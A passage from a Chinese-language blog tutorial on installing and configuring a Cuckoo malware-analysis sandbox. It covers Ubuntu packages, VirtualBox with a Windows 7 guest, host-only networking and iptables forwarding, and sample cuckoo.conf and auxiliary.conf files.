xenial-updates main restricted<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates main restricted multiverse universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial multiverse<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-updates multiverse<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-backports main restricted universe multiverse<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-backports main restricted universe multiverse<br>deb http:<span class="hljs-regexp">//</span>archive.canonical.com/ubuntu xenial partner<br>deb-src http:<span class="hljs-regexp">//</span>archive.canonical.com/ubuntu xenial partner<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security main restricted<br>deb-src http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security main restricted multiverse universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security universe<br>deb http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/ubuntu/</span> xenial-security multiverse<br></code></pre></td></tr></table></figure><p>然后更新</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo apt-get update &amp;&amp; apt-get upgrade<br></code></pre></td></tr></table></figure><h3 id="依次获取软件包"><a href="#依次获取软件包" class="headerlink" title="依次获取软件包"></a>依次获取软件包</h3><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install python python-pip python-<span class="hljs-built_in">dev</span> libffi-<span class="hljs-built_in">dev</span> libssl-<span class="hljs-built_in">dev</span><br>sudo apt-<span class="hljs-built_in">get</span> install python-virtualenv python-setuptools<br>sudo apt-<span class="hljs-built_in">get</span> install libjpeg-<span class="hljs-built_in">dev</span> zlib1g-<span class="hljs-built_in">dev</span> swig<br></code></pre></td></tr></table></figure><h3 id="安装MongoDB"><a href="#安装MongoDB" class="headerlink" title="安装MongoDB"></a>安装MongoDB</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs anzhuang">sudo apt-get install mongodb<br></code></pre></td></tr></table></figure><h3 id="安装PostgreSQL"><a href="#安装PostgreSQL" class="headerlink" title="安装PostgreSQL"></a>安装PostgreSQL</h3><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">sudo apt-<span class="hljs-built_in">get</span> install postgresql libpq-<span class="hljs-built_in">dev</span><br></code></pre></td></tr></table></figure><h3 id="下载VirtualBox，并安装"><a href="#下载VirtualBox，并安装" class="headerlink" title="下载VirtualBox，并安装"></a>下载<a href="https://www.virtualbox.org/wiki/Download_Old_Builds_6_0">VirtualBox</a>，并安装</h3><p>注意：官方文档表示<strong>Cuckoo 支持 VirtualBox 4.3、5.0、5.1 和 5.2</strong>，作者使用的是6.0版本。<strong>VirtualBox位数要和Ubuntu保持一致</strong>。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> dpkg -i virtualbox-<span class="hljs-number">6</span>.<span class="hljs-number">0</span>_6.<span class="hljs-number">0</span>.<span class="hljs-number">8</span>-<span class="hljs-number">130520</span>~Ubuntu~xenial_amd64.deb<br></code></pre></td></tr></table></figure><p>如果报错提示 Package libsdl1.2debian is not installed，如下图</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419100554521.png" alt="image-20220419100554521"></p><p>安装libsdl1.2debian后，再次执行安装Virtualbox</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install libsdl1.2debian<br></code></pre></td></tr></table></figure><p>执行virtualbox弹出Virtualbox界面，安装成功</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419101059442.png" alt="image-20220419101059442"></p><h3 id="安装Tcpdump"><a href="#安装Tcpdump" class="headerlink" title="安装Tcpdump"></a>安装Tcpdump</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> install tcpdump apparmor-utils<br>sudo aa-<span class="hljs-built_in">disable</span> /usr/sbin/tcpdump<br></code></pre></td></tr></table></figure><h3 id="安装-M2Crypto"><a href="#安装-M2Crypto" class="headerlink" title="安装 M2Crypto"></a>安装 M2Crypto</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sudo</span> pip install m2crypto==<span class="hljs-number">0</span>.<span class="hljs-number">24</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><h3 id="安装Cuckoo"><a href="#安装Cuckoo" class="headerlink" title="安装Cuckoo"></a>安装Cuckoo</h3><p>更新pip，然后安装Cuckoo（因为要下载很多包，所以时间会长一点）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -m pip install --user --upgrade pip==<span class="hljs-number">20</span>.<span class="hljs-number">2</span>.<span class="hljs-number">4</span><br><span class="hljs-attribute">pip</span> install -U cuckoo<br></code></pre></td></tr></table></figure><p>执行cuckoo弹出Cuckoo界面，安装成功</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419104409949.png" alt="image-20220419104409949"></p><h3 id="创建Cuckoo-Working-Directory"><a href="#创建Cuckoo-Working-Directory" class="headerlink" title="创建Cuckoo Working Directory"></a>创建Cuckoo Working Directory</h3><p>注：因为cuckoo用户创建虚拟机时就存在且设为sudo，官方文档中创建用户设置sudo权限没有必要了</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">sudo mkdir /opt/cuckoo<br>sudo chown cuckoo:cuckoo /opt/cuckoo<br><span class="hljs-meta prompt_"># </span><span class="language-bash">cuckoo -cwd 可以将工作路径切换到/opt/cuckoo这个目录下，这样在这个目录下就可以看到所有的配置文件</span><br>cuckoo --cwd /opt/cuckoo<br></code></pre></td></tr></table></figure><h3 id="配置网卡以及IP转发"><a href="#配置网卡以及IP转发" class="headerlink" title="配置网卡以及IP转发"></a>配置网卡以及IP转发</h3><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 创建一张网卡</span><br>vboxmanage hostonlyif create<br>vboxmanage hostonlyif ipconfig vboxnet0 <span class="hljs-params">--ip</span> 192.168.56.1<br><br><span class="hljs-comment"># 设置host与guest的转发规则</span><br><span class="hljs-comment"># 注意网卡与你的电脑的网卡是否对应 ifconfig可查看对应网卡</span><br>iptables -A FORWARD -o ens32 -i vboxnet0 -s 192.168.56.0/24 -m conntrack <span class="hljs-params">--ctstate</span> NEW -j ACCEPT<br>iptables -A FORWARD -m conntrack <span class="hljs-params">--ctstate</span> ESTABLISHED,RELATED -j ACCEPT<br>iptables -A POSTROUTING -t nat -j MASQUERADE<br><br><span class="hljs-comment"># 开启转发</span><br><span class="hljs-keyword">echo</span> 1 &gt; <span class="hljs-string">/proc/sys/net/ipv4/ip_forward</span><br></code></pre></td></tr></table></figure><h2 id="Guest配置"><a href="#Guest配置" class="headerlink" title="Guest配置"></a>Guest配置</h2><h3 id="VirtualBox新建windows-7虚拟机"><a href="#VirtualBox新建windows-7虚拟机" class="headerlink" title="VirtualBox新建windows 7虚拟机"></a>VirtualBox新建windows 7虚拟机</h3><p>安装增强工具，并安装python2.7</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419130731226.png" alt="image-20220419130731226"></p><p>配置pip环境变量，安装Pillow</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">pip <span class="hljs-keyword">install</span> pillow<br></code></pre></td></tr></table></figure><p>关闭防火墙和自动更新，设置共享文件夹</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419133842806.png" alt="image-20220419133842806"></p><p>将Ubuntu中&#x2F;opt&#x2F;cuckoo&#x2F;agent&#x2F;agent.py重命名为agent.pyw放到C:\Users\[USER]\AppData\Roaming\MicroSoft\Windows\Start Menu\Programs\Startup\路径下</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419134212728.png" alt="image-20220419134212728"></p><p>设置win7虚拟机网络为仅主机模式，设置ipv4属性，确定host和guest可以互相ping通</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419134720201.png" alt="image-20220419134720201"></p><p>重启后（重启是为了让agent.pyw自启动，也可以手动启动，<strong>但是agent必须在管理员权限下运行</strong>，不然cuckoo会报错），拍设快照Snapshot 1</p><h2 id="修改Cuckoo配置文件"><a href="#修改Cuckoo配置文件" class="headerlink" title="修改Cuckoo配置文件"></a>修改Cuckoo配置文件</h2><p>需要修改的包括&#x2F;home&#x2F;cuckoo{ubuntu用户名}&#x2F;.cuckoo&#x2F;conf 目录下的cuckoo.conf、auxiliary.conf、virtualbox.conf</p><h3 id="cuckoo-conf"><a href="#cuckoo-conf" class="headerlink" title="cuckoo.conf"></a>cuckoo.conf</h3><p>基本不需要修改</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[cuckoo]<br><span class="hljs-comment"># Enable or disable startup version check. When enabled, Cuckoo will connect</span><br><span class="hljs-comment"># to a remote location to verify whether the running version is the latest</span><br><span class="hljs-comment"># one available.</span><br>version_check = yes<br><br><span class="hljs-comment"># Cuckoo will stop at startup if the version check reports vulnerabilities in</span><br><span class="hljs-comment"># one of Cuckoo&#x27;s dependencies. This setting ignores the vulnerabilities</span><br><span class="hljs-comment"># and starts anyway</span><br>ignore_vulnerabilities = no<br><br><span class="hljs-comment"># The authentication token that is required to access the Cuckoo API, using</span><br><span class="hljs-comment"># HTTP Bearer authentication. This will protect the API instance against</span><br><span class="hljs-comment"># unauthorized access and CSRF attacks. It is strongly recommended to set this</span><br><span class="hljs-comment"># to a secure value.</span><br>api_token = HGiyE0KMWo1-0FZpvRCZnw<br><br><span class="hljs-comment"># The Web secret is used as a very basic, but successful way to provide basic</span><br><span class="hljs-comment"># authentication to the Cuckoo Web Interface. This is a shared secret amongst</span><br><span class="hljs-comment"># all users of this Cuckoo instance and will &quot;protect&quot; usage from users outside</span><br><span class="hljs-comment"># of this instance. Therefore, if you&#x27;d like to share this Cuckoo instance with</span><br><span class="hljs-comment"># the outside world, then don&#x27;t use the Web secret functionality.</span><br>web_secret = <br><br><span class="hljs-comment"># If turned on, Cuckoo will delete the original file after its analysis</span><br><span class="hljs-comment"># has been completed.</span><br>delete_original = no<br><br><span class="hljs-comment"># If turned on, Cuckoo will delete the copy of the original file in the</span><br><span class="hljs-comment"># local binaries repository after the analysis has finished. (On *nix this</span><br><span class="hljs-comment"># will also invalidate the file called &quot;binary&quot; in each analysis directory,</span><br><span class="hljs-comment"># as this is a symlink.)</span><br>delete_bin_copy = no<br><br><span class="hljs-comment"># Specify the name of the machinery module to use, this module will</span><br><span class="hljs-comment"># define the interaction between Cuckoo and your virtualization software</span><br><span class="hljs-comment"># of choice.</span><br>machinery = virtualbox<br><br><span class="hljs-comment"># Enable creation of memory dump of the analysis machine before shutting</span><br><span class="hljs-comment"># down. Even if turned off, this functionality can also be enabled at</span><br><span class="hljs-comment"># submission. Currently available for: VirtualBox and libvirt modules (KVM).</span><br>memory_dump = no<br><br><span class="hljs-comment"># When the timeout of an analysis is hit, the VM is just killed by default.</span><br><span class="hljs-comment"># For some long-running setups it might be interesting to terminate the</span><br><span class="hljs-comment"># monitored processes before killing the VM so that connections are closed.</span><br>terminate_processes = no<br><br><span class="hljs-comment"># Enable automatically re-schedule of &quot;broken&quot; tasks each startup.</span><br><span class="hljs-comment"># Each task found in status &quot;processing&quot; is re-queued for analysis.</span><br>reschedule = no<br><br><span class="hljs-comment"># Enable processing of results within the main cuckoo process.</span><br><span class="hljs-comment"># This is the default behavior but can be switched off for setups that</span><br><span class="hljs-comment"># require high stability and process the results in a separate task.</span><br>process_results = yes<br><br><span class="hljs-comment"># Limit the amount of analysis jobs a Cuckoo process goes through.</span><br><span class="hljs-comment"># This can be used together with a watchdog to mitigate risk of memory leaks.</span><br>max_analysis_count = 0<br><br><span class="hljs-comment"># Limit the number of concurrently executing analysis machines.</span><br><span class="hljs-comment"># This may be useful on systems with limited resources.</span><br><span class="hljs-comment"># Set to 0 to disable any limits.</span><br>max_machines_count = 0<br><br><span class="hljs-comment"># Limit the amount of VMs that are allowed to start in parallel. Generally</span><br><span class="hljs-comment"># speaking starting the VMs is one of the more CPU intensive parts of the</span><br><span class="hljs-comment"># actual analysis. This option tries to avoid maxing out the CPU completely.</span><br>max_vmstartup_count = 10<br><br><span class="hljs-comment"># Minimum amount of free space (in MB) available before starting a new task.</span><br><span class="hljs-comment"># This tries to avoid failing an analysis because the reports can&#x27;t be written</span><br><span class="hljs-comment"># due out-of-diskspace errors. Setting this value to 0 disables the check.</span><br><span class="hljs-comment"># (Note: this feature is currently not supported under Windows.)</span><br>freespace = 1024<br><br><span class="hljs-comment"># Temporary directory containing the files uploaded through Cuckoo interfaces</span><br><span class="hljs-comment"># (api.py and Django web interface). Defaults to the default temporary</span><br><span class="hljs-comment"># directory of the operating system (e.g., /tmp on Linux). Overwrite the value</span><br><span class="hljs-comment"># if you&#x27;d like to specify an alternative path.</span><br>tmppath = <br><br><span class="hljs-comment"># Path to the unix socket for running root commands.</span><br>rooter = /tmp/cuckoo-rooter<br><br>[feedback]<br><span class="hljs-comment"># Cuckoo is capable of sending &quot;developer feedback&quot; to the developers so that</span><br><span class="hljs-comment"># they can more easily improve the project. This functionality also allows the</span><br><span class="hljs-comment"># user to quickly request new features, report bugs, and get in touch with</span><br><span class="hljs-comment"># support in general, etc.</span><br>enabled = no<br>name = <br>company = <br>email = <br><br>[resultserver]<br><span class="hljs-comment"># The Result Server is used to receive in real time the behavioral logs</span><br><span class="hljs-comment"># produced by the analyzer.</span><br><span class="hljs-comment"># Specify the IP address of the host. The analysis machines should be able</span><br><span class="hljs-comment"># to contact the host through such address, so make sure it&#x27;s valid.</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> if you set resultserver IP to 0.0.0.0 you have to set the option</span><br><span class="hljs-comment"># `resultserver_ip` for all your virtual machines in machinery configuration.</span><br>ip = 192.168.56.1<br><br><span class="hljs-comment"># Specify a port number to bind the result server on. Set to 0 to use a random</span><br><span class="hljs-comment"># port.</span><br>port = 2042<br><br><span class="hljs-comment"># Maximum size of uploaded files from VM (screenshots, dropped files, log).</span><br><span class="hljs-comment"># The value is expressed in bytes, by default 128 MB.</span><br>upload_max_size = 134217728<br><br>[processing]<br><span class="hljs-comment"># Set the maximum size of analyses generated files to process. This is used</span><br><span class="hljs-comment"># to avoid the processing of big files which may take a lot of processing</span><br><span class="hljs-comment"># time. The value is expressed in bytes, by default 128 MB.</span><br>analysis_size_limit = 134217728<br><br><span class="hljs-comment"># Enable or disable DNS lookups.</span><br>resolve_dns = yes<br><br><span class="hljs-comment"># Enable PCAP sorting, needed for the connection content view in the web interface.</span><br>sort_pcap = yes<br><br>[database]<br><span class="hljs-comment"># Specify the database connection string.</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> If you are using a custom database (different from sqlite), you have to</span><br><span class="hljs-comment"># use utf-8 encoding when issuing the SQL database creation statement.</span><br><span class="hljs-comment"># Examples, see documentation for more:</span><br><span class="hljs-comment"># sqlite:///foo.db</span><br><span class="hljs-comment"># postgresql://foo:bar@localhost:5432/mydatabase</span><br><span class="hljs-comment"># mysql://foo:bar@localhost/mydatabase</span><br><span class="hljs-comment"># If empty, defaults to a SQLite3 database at $CWD/cuckoo.db.</span><br>connection = <br><br><span class="hljs-comment"># Database connection timeout in seconds.</span><br><span class="hljs-comment"># If empty, default is set to 60 seconds.</span><br>timeout = 60<br><br>[timeouts]<br><span class="hljs-comment"># Set the default analysis timeout expressed in seconds. This value will be</span><br><span class="hljs-comment"># used to define after how many seconds the analysis will terminate unless</span><br><span class="hljs-comment"># otherwise specified at submission.</span><br>default = 120<br><br><span class="hljs-comment"># Set the critical timeout expressed in (relative!) seconds. It will be added</span><br><span class="hljs-comment"># to the default timeout above and after this timeout is hit</span><br><span class="hljs-comment"># Cuckoo will consider the analysis failed and it will shutdown the machine</span><br><span class="hljs-comment"># no matter what. When this happens the analysis results will most likely</span><br><span class="hljs-comment"># be lost.</span><br>critical = 60<br><br><span class="hljs-comment"># Maximum time to wait for virtual machine status change. For example when</span><br><span class="hljs-comment"># shutting down a vm. Default is 60 seconds.</span><br>vm_state = 60<br><br>[remotecontrol]<br><span class="hljs-comment"># Enable for remote control of analysis machines inside the web interface.</span><br>enabled = no<br><br><span class="hljs-comment"># Set host of the running guacd service.</span><br>guacd_host = localhost<br><br><span class="hljs-comment"># Set port of the running guacd service.</span><br>guacd_port = 4822<br></code></pre></td></tr></table></figure><h3 id="auxiliary-conf"><a href="#auxiliary-conf" class="headerlink" title="auxiliary.conf"></a>auxiliary.conf</h3><p>sniffer enabled &#x3D;yes</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[sniffer]</span><br><span class="hljs-comment"># Enable or disable the use of an external sniffer (tcpdump) [yes/no].</span><br><span class="hljs-attr">enabled</span> = <span class="hljs-literal">yes</span><br><br><span class="hljs-comment"># Specify the path to your local installation of tcpdump. Make sure this</span><br><span class="hljs-comment"># path is correct.</span><br><span class="hljs-attr">tcpdump</span> = /usr/sbin/tcpdump<br><br><span class="hljs-comment"># We used to define the network interface to capture on in auxiliary.conf, but</span><br><span class="hljs-comment"># this has been moved to the &quot;interface&quot; field of each Virtual Machinery</span><br><span class="hljs-comment"># configuration.</span><br><br><span class="hljs-comment"># Specify a Berkeley packet filter to pass to tcpdump.</span><br><span class="hljs-comment"># <span class="hljs-doctag">Note:</span> packer filtering is not possible when using &quot;nictrace&quot; functionality</span><br><span class="hljs-comment"># from VirtualBox (for example dumping inter-VM traffic).</span><br><span class="hljs-attr">bpf</span> = <br><br><span class="hljs-section">[mitm]</span><br><span class="hljs-comment"># Enable man in the middle proxying (mitmdump) [yes/no].</span><br><span class="hljs-attr">enabled</span> = <span class="hljs-literal">no</span><br><br><span class="hljs-comment"># Specify the path to your local installation of mitmdump. Make sure this</span><br><span class="hljs-comment"># path is correct.</span><br><span class="hljs-attr">mitmdump</span> = /usr/local/bin/mitmdump<br><br><span class="hljs-comment"># Listen port base. Each virtual machine will use its own port to be</span><br><span class="hljs-comment"># able to make a good distinction between the various running analyses.</span><br><span class="hljs-comment"># Generally port 50000 should be fine, in this case port 50001, 50002, etc</span><br><span class="hljs-comment"># will also be used - again, one port per analyses.</span><br><span class="hljs-attr">port_base</span> = <span class="hljs-number">50000</span><br><br><span class="hljs-comment"># Script file to interact with the network traffic. Please refer to the</span><br><span class="hljs-comment"># documentation of mitmproxy/mitmdump to get an understand of their internal</span><br><span class="hljs-comment"># workings. (https://mitmproxy.org/doc/scripting/inlinescripts.html)</span><br><span class="hljs-attr">script</span> = stuff/mitm.py<br><br><span class="hljs-comment"># Path to the certificate to be used by mitmdump. This file will be</span><br><span class="hljs-comment"># automatically generated for you if you run mitmdump once. It&#x27;s just that</span><br><span class="hljs-comment"># you have to copy it from ~/.mitmproxy/mitmproxy-ca-cert.p12 to somewhere</span><br><span class="hljs-comment"># in the analyzer/windows/ directory. Recommended is to write the certificate</span><br><span class="hljs-comment"># to analyzer/windows/bin/cert.p12, in that case the following option should</span><br><span class="hljs-comment"># be set to bin/cert.p12.</span><br><span class="hljs-attr">certificate</span> = bin/cert.p12<br><br><span class="hljs-section">[replay]</span><br><span class="hljs-comment"># Enable PCAP replay capabilities.</span><br><span class="hljs-attr">enabled</span> = <span class="hljs-literal">yes</span><br><br><span class="hljs-comment"># Specify the path to your local installation of mitmdump. Make sure this</span><br><span class="hljs-comment"># path is correct. Note that this should be mitmproxy 3.0.5 or higher,</span><br><span class="hljs-comment"># installed in a separate virtualenv (or similar).</span><br><span class="hljs-attr">mitmdump</span> = /usr/local/bin/mitmdump<br><br><span class="hljs-comment"># Listen port base. Each virtual machine will use its own port to be</span><br><span class="hljs-comment"># able to make a good distinction between the various running analyses.</span><br><span class="hljs-comment"># Generally port 51000 should be fine, in this case port 51001, 51002, etc</span><br><span class="hljs-comment"># will also be used - again, one port per analyses.</span><br><span class="hljs-attr">port_base</span> = <span class="hljs-number">51000</span><br><br><span class="hljs-comment"># Path to the certificate to be used by mitmdump. This file will be</span><br><span class="hljs-comment"># automatically generated for you if you run mitmdump once. It&#x27;s just that</span><br><span class="hljs-comment"># you have to copy it from ~/.mitmproxy/mitmproxy-ca-cert.p12 to somewhere</span><br><span class="hljs-comment"># in the analyzer/windows/ directory. Recommended is to write the certificate</span><br><span class="hljs-comment"># to analyzer/windows/bin/cert.p12, in that case the following option should</span><br><span class="hljs-comment"># be set to bin/cert.p12.</span><br><span class="hljs-attr">certificate</span> = bin/cert.p12<br><br><span class="hljs-section">[services]</span><br><span class="hljs-comment"># Provide extra services accessible through the network of the analysis VM</span><br><span class="hljs-comment"># provided in separate, standalone, Virtual Machines [yes/no].</span><br><span class="hljs-attr">enabled</span> = <span class="hljs-literal">no</span><br><br><span class="hljs-comment"># Comma-separated list with each Virtual Machine containing said service(s).</span><br><span class="hljs-attr">services</span> = honeyd<br><br><span class="hljs-comment"># Time in seconds required to boot these virtual machines. E.g., some services</span><br><span class="hljs-comment"># will only get online after a minute because initialization takes a while.</span><br><span class="hljs-attr">timeout</span> = <span class="hljs-number">0</span><br><br><span class="hljs-section">[reboot]</span><br><span class="hljs-comment"># This auxiliary module should be enabled for reboot analysis support.</span><br><span class="hljs-attr">enabled</span> = <span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure><h3 id="virtualbox-conf"><a href="#virtualbox-conf" class="headerlink" title="virtualbox.conf"></a>virtualbox.conf</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 